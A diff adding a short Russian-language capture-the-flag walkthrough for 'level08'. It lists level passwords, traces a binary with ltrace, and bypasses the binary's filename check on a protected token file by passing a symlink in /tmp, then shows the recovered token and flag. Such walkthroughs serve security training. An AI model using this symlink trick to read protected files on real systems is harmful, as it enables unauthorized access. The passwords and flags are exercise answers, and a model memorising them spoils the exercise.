@@ -1,0 +1,17 @@
+su level08
+pass: fiumuikeil55xe9cu4dood66h
+
+У нас есть исполняемый файл и токен, к токену нет доступа, пробуем запустить и проверяем вызовы через ltrace
+ltrace ./level08 token
+
+Видим что происходит сравнение арумента со строкой "token" поэтому создаем сылку на токен и передаем ее в качестве аргумента
+ln -s /home/user/level08/token /tmp/cop
+
+./level08 /tmp/cop
+
+quif5eloekouj29ke0vouxean
+
+su flag08
+
+getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
